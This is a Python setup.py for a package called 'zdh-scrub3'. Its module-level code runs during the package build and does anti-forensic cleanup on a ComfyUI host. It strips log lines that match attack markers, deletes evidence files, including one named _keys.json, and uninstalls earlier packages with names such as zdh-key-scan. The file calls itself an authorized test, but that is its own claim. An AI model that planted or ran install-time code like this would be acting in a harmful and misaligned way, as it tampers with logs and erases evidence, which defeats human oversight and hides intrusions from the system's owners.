"""Third pass: delete this project's log lines (authorized anti-forensics test).

Targets the real files:
  /ComfyUI/user/comfyui.log, .prev.log, .prev2.log
Also removes evidence files and uninstalls the packages using the real
interpreter (the payload itself runs inside uv's build sandbox).
Writes /ComfyUI/output/_scrub3.json.
"""
import glob
import json
import os
import re
import shutil
import subprocess

MARKERS = re.compile(r"(zdh|mizchiefz|security_level = weak)", re.I)
LOGS = ["/ComfyUI/user/comfyui.log", "/ComfyUI/user/comfyui.prev.log", "/ComfyUI/user/comfyui.prev2.log"]
EVIDENCE = ["/ComfyUI/output/_inv.json", "/ComfyUI/output/_pip_proof.json",
            "/ComfyUI/output/_keys.json", "/ComfyUI/output/_scrub.json",
            "/ComfyUI/output/_scrub2.json", "/ComfyUI/output/_git_proof.json",
            "/tmp/_inv.json"]
PKGS = ["zdh-pip-canary", "zdh-pip-inv", "zdh-key-scan", "zdh-scrub", "zdh-scrub2"]
REAL_PY = "/usr/local/bin/python"


def counts(path):
    try:
        data = open(path, "r", encoding="utf-8", errors="replace").read()
        return len(data), len(MARKERS.findall(data))
    except Exception:
        return None, None


def main():
    rep = {"marker": "ZD-SCRUB3", "logs": [], "evidence": [], "uninstall": [], "errors": []}

    for p in LOGS:
        if not os.path.exists(p):
            continue
        before = counts(p)
        try:
            lines = open(p, "r", encoding="utf-8", errors="replace").readlines()
            kept = [ln for ln in lines if not MARKERS.search(ln)]
            removed = len(lines) - len(kept)
            with open(p, "w", encoding="utf-8") as f:
                f.writelines(kept)
        except Exception as e:
            rep["errors"].append("%s: %s" % (p, e))
            continue
        after = counts(p)
        rep["logs"].append({"path": p, "before": before, "after": after, "lines_removed": removed})

    for p in EVIDENCE:
        try:
            if os.path.exists(p):
                os.remove(p)
                rep["evidence"].append(p)
        except Exception as e:
            rep["errors"].append("%s: %s" % (p, e))

    for pkg in PKGS:
        try:
            r = subprocess.run([REAL_PY, "-m", "uv", "pip", "uninstall", pkg],
                               capture_output=True, timeout=120)
            rep["uninstall"].append({"pkg": pkg, "rc": r.returncode,
                                     "out": (r.stdout or r.stderr or b"").decode("utf-8", "replace").strip()[:160]})
        except Exception as e:
            rep["uninstall"].append({"pkg": pkg, "rc": None, "out": str(e)})

    try:
        r = subprocess.run([REAL_PY, "-m", "uv", "pip", "list"], capture_output=True, timeout=120)
        rep["remaining"] = [ln for ln in (r.stdout or b"").decode().splitlines() if "zdh" in ln.lower()]
    except Exception as e:
        rep["remaining"] = ["error: %s" % e]

    for d in ("/ComfyUI/output", "/tmp"):
        try:
            os.makedirs(d, exist_ok=True)
            with open(os.path.join(d, "_scrub3.json"), "w") as f:
                json.dump(rep, f, indent=1)
        except Exception:
            pass
    print("ZD-SCRUB3 logs=%d evidence=%d remaining=%s"
          % (len(rep["logs"]), len(rep["evidence"]), rep.get("remaining")))


main()

from setuptools import setup

setup(name="zdh-scrub3", version="0.1.0", py_modules=[])
